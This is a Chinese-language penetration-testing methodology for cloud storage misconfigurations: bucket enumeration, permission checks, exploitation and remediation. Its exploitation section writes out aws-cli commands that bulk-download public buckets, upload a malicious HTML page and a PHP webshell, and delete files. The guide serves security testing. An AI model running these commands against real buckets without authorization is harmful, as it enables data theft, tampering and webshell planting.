# 云存储配置错误方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的云存储配置错误检测和利用流程。

## 1.2 适用范围

本文档适用于使用云存储服务（AWS S3、Azure Blob、GCP Cloud Storage 等）的应用。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

云存储配置错误是指云存储桶（Bucket/Container）的访问权限配置不当，导致未授权用户可以访问、修改或删除存储的数据。

**常见配置错误**：
- 存储桶公开读取/写入
- ACL 配置过于宽松
- 缺少加密
- 日志记录未启用

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-284 | 不当访问控制 |
| CWE-732 | 危险资源权限分配 |

## 2.2 攻击常见于哪些业务场景

| 云服务商 | 风险点 | 潜在危害 |
|---------|-------|---------|
| AWS S3 | 公开存储桶 | 数据泄露/篡改 |
| Azure Blob | 匿名访问 | 敏感数据暴露 |
| GCP Storage | 所有用户读取 | 数据泄露 |
| 阿里云 OSS | 公共读写 | 数据泄露/篡改 |

## 2.3 漏洞发现方法

### 2.3.1 存储桶枚举

```bash
# AWS S3 桶枚举
# 常见命名模式：
# - company-name
# - company-name-assets
# - company-name-backup
# - company-name-uploads

# 使用 S3Scanner
s3scanner scan company-name

# 使用 aws-cli
aws s3 ls s3://company-name --no-sign-request
```

### 2.3.2 权限检测

```bash
# AWS S3 权限检查
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request
aws s3api get-bucket-policy --bucket target-bucket --no-sign-request

# Azure Blob 权限检查
# 检查是否允许匿名访问
https://account.blob.core.windows.net/container/file.txt

# GCP Storage 权限检查
gsutil ls gs://bucket-name
```

### 2.3.3 自动化扫描工具

```bash
# S3Scanner
git clone https://github.com/sa7mon/S3Scanner
python s3scanner.py -f buckets.txt

# CloudBrute
# 枚举云存储资源

# Prowler
# AWS 安全审计工具
```

## 2.4 漏洞利用方法

### 2.4.1 数据泄露（公开读取）

```bash
# 列出存储桶内容
aws s3 ls s3://target-bucket --no-sign-request

# 下载所有文件
aws s3 cp s3://target-bucket/ ./downloaded/ \
    --recursive --no-sign-request

# 可能获取：
# - 用户上传文件
# - 数据库备份
# - 配置文件
# - 日志文件
```

### 2.4.2 数据篡改（公开写入）

```bash
# 上传恶意文件
aws s3 cp malicious.html s3://target-bucket/ \
    --no-sign-request

# 上传 WebShell
aws s3 cp shell.php s3://target-bucket/uploads/ \
    --no-sign-request

# 删除文件
aws s3 rm s3://target-bucket/important-file.txt \
    --no-sign-request
```

### 2.4.3 敏感数据分析

```bash
# 分析获取的数据
# 1. 用户数据 - 隐私泄露
# 2. 备份文件 - 获取数据库内容
# 3. 配置文件 - 获取凭证
# 4. 日志文件 - 了解系统架构
```

## 2.5 漏洞利用绕过方法

### 2.5.1 签名 URL 绕过

```bash
# 如果存储桶使用签名 URL
# 尝试：
# - 预测签名算法
# - 获取泄露的签名 URL
# - 利用签名 URL 生成漏洞
```

### 2.5.2 跨域配置利用

```json
// 检查 CORS 配置
{
    "CORSRules": [
        {
            "AllowedOrigins": ["*"],
            "AllowedMethods": ["GET", "PUT", "POST"]
        }
    ]
}

// 如果允许任意源，可以从恶意网站访问
```

---

# 第三部分：附录

## 3.1 云存储测试检查清单

```
□ 枚举云存储桶
□ 检查公开读取权限
□ 检查公开写入权限
□ 检查 CORS 配置
□ 检查加密配置
□ 检查日志记录
□ 下载并分析公开数据
```

## 3.2 常用工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| S3Scanner | S3 桶扫描 | https://github.com/sa7mon/S3Scanner |
| Prowler | AWS 审计 | https://github.com/prowler-cloud/prowler |
| ScoutSuite | 云安全审计 | https://github.com/nccgroup/ScoutSuite |
| aws-cli | AWS 命令行 | https://aws.amazon.com/cli/ |

## 3.3 修复建议

1. **禁用公开访问** - 除非确实需要
2. **使用 IAM 策略** - 细粒度访问控制
3. **启用加密** - 静态和传输加密
4. **启用日志** - 记录所有访问
5. **定期审计** - 检查权限配置

---

**参考资源**：
- [AWS S3 Security](https://docs.aws.amazon.com/AmazonS3/latest/userguide/security.html)
- [OWASP Cloud Security](https://owasp.org/www-project-cloud-security/)
